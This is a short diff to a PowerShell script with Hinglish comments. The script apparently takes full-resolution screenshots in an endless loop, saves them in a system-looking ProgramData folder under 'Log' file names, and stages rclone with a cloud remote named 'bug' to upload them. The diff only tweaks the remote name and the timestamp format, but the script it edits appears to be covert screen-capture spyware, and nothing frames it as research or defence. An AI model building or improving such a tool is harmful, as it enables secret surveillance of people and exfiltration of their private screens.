@@ -1,7 +1,7 @@
 $BaseDir = "C:\ProgramData\SystemData"
 $LogDir = "$BaseDir\Logs"
 $RclonePath = "$BaseDir\rclone.exe"
-$DriveName = "bug:hostname" # Config mein bugdrive remote hai aur bug folder
+$DriveName = "bug:host-name" # Config mein bugdrive remote hai aur bug folder
 
 # Folder check
 if (!(Test-Path $LogDir)) { New-Item -ItemType Directory -Path $LogDir -Force }
@@ -20,7 +20,7 @@ $DpiAwareness = Add-Type -MemberDefinition $Signature -Name "DpiAwareness" -Name
 
 while($true) {
     try {
-        $Time = Get-Date -Format "ss-mm-HH_dd"
+        $Time = Get-Date -Format "HH-mm_dd"
         $File = "$LogDir\Log_$Time.jpg"
 
         # Ab ye actual resolution detect karega (e.g., 1920x1080 chahay scaling ho bhi)
